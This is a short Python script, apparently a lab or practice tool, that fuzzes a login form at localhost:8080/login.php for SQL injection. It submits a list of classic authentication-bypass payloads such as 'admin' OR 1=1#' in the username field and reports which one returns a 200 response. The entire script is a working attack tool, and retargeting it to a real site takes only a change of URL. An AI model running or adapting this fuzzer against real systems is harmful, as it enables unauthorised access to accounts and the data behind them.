import requests

url = "http://localhost:8080/login.php" 

payloads = [
    "admin' -- ",
    "admin'#",
    "admin' OR 1=1#",
    "admin' OR '1'='1",
    "admin') OR ('1'='1",
    "admin\" OR 1=1#",
    "admin' OR 1=1 LIMIT 1#"
]

print("Starting SQLi Fuzzer...")

for payload in payloads:
    data = {
        'username': payload,
        'password': 'password'
    }
    
    response = requests.post(url, data=data, allow_redirects=False)
    
    if response.status_code == 200:
        print(f"[+] BYPASS SUCCESS (200 OK): {payload}")
        break
    else:
        print(f"[-] Failed (302): {payload}")